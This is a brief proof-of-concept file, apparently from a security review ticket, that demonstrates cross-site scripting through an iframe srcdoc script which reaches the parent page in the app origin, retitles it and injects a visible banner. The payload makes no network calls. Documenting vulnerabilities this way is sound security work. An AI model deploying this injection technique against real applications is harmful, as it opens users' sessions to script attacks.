# PoC PSECENG-4074

Benign security-review proof of concept. The iframe below runs only local DOM
code in the app origin (sets the document title and adds a visible banner). It
makes no network calls and touches no GitHub, Slack, or Drive API.

<iframe srcdoc="<script>try{var d=parent.document;d.title='XSS-POC-4074';var b=d.createElement('div');b.id='xss-poc-4074';b.textContent='XSS-POC-4074 script executed in app origin';b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#c00;color:#fff;font:20px sans-serif;padding:12px;text-align:center';d.body.appendChild(b);}catch(e){}</script>"></iframe>
